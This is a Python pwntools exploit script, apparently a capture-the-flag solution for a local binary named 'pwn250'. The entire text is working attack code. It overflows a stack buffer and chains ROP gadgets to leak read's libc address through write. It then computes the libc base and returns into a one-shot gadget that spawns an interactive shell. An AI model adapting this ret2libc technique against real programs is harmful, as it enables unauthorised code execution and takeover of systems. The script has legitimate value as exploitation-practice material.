from pwn import *

p = process("./pwn250")
e = ELF("/lib/x86_64-linux-gnu/libc.so.6")

pop3ret = 0x000000000040056A		# pop rdi, rsi, rdx

read_plt = 0x0000000000400440
read_got = 0x601020
write_plt= 0x0000000000400430
bss = 0x0000000000601040

payload ="a"*(0x80+8)
payload+=p64(0x000000000040056D)	# return
payload+=p64(pop3ret)
payload+=p64(1)
payload+=p64(read_got)
payload+=p64(8)
payload+=p64(write_plt)			# leak address of read
payload+=p64(0x400592)			# restart main
p.send(payload)

read = u64(p.recv(8))
libcbase = read - e.symbols['read']
oneshot = libcbase + 0xf0274
log.info("libc base = " + hex(libcbase))
log.info("one-shot gadget = " + hex(oneshot))

payload ="a"*(0x80+8)
payload+=p64(oneshot)        # return
p.send(payload)
p.interactive()
